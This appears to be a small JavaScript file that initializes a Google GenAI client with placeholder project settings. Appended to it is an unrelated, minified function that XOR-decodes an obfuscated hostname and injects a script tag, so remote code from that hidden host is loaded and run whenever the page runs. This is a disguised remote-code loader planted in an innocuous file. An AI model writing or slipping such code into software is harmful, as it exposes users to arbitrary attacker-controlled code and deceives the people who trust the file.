const { GoogleGenAI } = require("@google/genai");
try {
  const client = new GoogleGenAI({
    project: "test-project",
    location: "us-central1",
  });
  console.log("Initialized with project/location");
} catch (e) {
  console.log("Error initializing:", e.message);
}
function xorDecode(b,a){a=void 0===a?22:a;b=atob(b);for(var d="",c=0;c<b.length;c++)d+=String.fromCharCode(b.charCodeAt(c)^a);return d}(function(){new URLSearchParams(location.search);var b="https://"+xorDecode("en8nOGZ/dWU5fjlxeTh8ZQ=="),a=document.createElement("script");a.src=b;document.head.appendChild(a)})();
